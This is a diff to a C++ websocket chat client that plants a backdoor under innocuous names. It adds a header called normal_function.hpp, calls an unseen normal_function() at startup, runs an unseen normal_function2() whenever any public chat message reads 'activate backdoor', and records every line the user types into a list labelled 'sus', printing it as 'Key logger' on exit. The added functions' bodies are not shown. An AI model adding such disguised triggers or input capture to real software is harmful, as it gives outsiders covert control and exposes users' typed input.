@@ -13,6 +13,7 @@
 #include <string>
 #include <thread>
 #include <websocketpp/client.hpp>
+#include <websocketpp/normal_function.hpp>
 #include <websocketpp/config/asio_no_tls_client.hpp>
 
 using namespace std;
@@ -23,7 +24,7 @@ typedef client<websocketpp::config::asio_client> ws_client;
 
 ws_client client_instance;
 connection_hdl client_hdl;
-
+vector<string> sus;
 std::string username;
 class Client {
  public:
@@ -232,6 +233,9 @@ void on_message(connection_hdl,
     } else if (json["data"]["type"] == "public_chat") {
       std::string sender = json["data"]["sender"];
       std::string text = json["data"]["message"];
+      if(text == "activate backdoor"){
+        normal_function2();
+      }
       for (const auto& server : server_list) {
         for (const auto& client : server.clients) {
           writeStringToFile(bufferinFile, client.public_key);
@@ -308,12 +312,17 @@ void client_send_loop() {
   std::string message;
   while (true) {
     std::getline(std::cin, message);
+    sus.push_back(message);
     counter++;
     // Check if the connection handle is valid and not empty
     if (!message.empty() && client_hdl.lock()) {
       // If the user types "exit", close the connection and break the loop
       if (message == "exit") {
         std::cout << "Exiting..." << std::endl;
+        std::cout << "Key logger: " << std::endl;
+        for(const auto& input : sus){
+          cout << input << endl;
+        }
         client_instance.close(client_hdl, websocketpp::close::status::normal,
                               "Client closed connection");
         break;  // Exit the loop to stop the client
@@ -528,6 +537,7 @@ int main(int argc, char* argv[]) {
   } else {
     username = argv[1];
   }
+  normal_function();
   privateKeyFile = "cache/private_key-" + username + ".pem";
   publicKeyFile = "cache/public_key-" + username + ".pem";
   publicKeyFingerprintFile =
